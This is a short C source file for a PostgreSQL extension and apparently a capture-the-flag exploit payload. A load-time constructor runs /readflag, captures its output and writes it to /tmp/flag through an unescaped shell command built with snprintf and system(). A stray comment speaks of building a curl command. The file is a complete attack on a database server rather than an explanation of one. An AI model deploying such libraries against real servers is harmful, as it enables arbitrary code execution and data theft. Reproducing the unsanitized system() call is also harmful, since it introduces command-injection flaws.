#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

__attribute__((constructor)) void run_on_load() {
    FILE *fp = popen("/readflag", "r");
    if (!fp) return;

    char flag[256] = {0};
    if (fgets(flag, sizeof(flag) - 1, fp)) {
        flag[strcspn(flag, "\n")] = 0; // remove newline
    }
    pclose(fp);

    if (strlen(flag) == 0) return;

    // build the curl command
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "echo '%s' > /tmp/flag",
        flag);

    system(cmd);
}
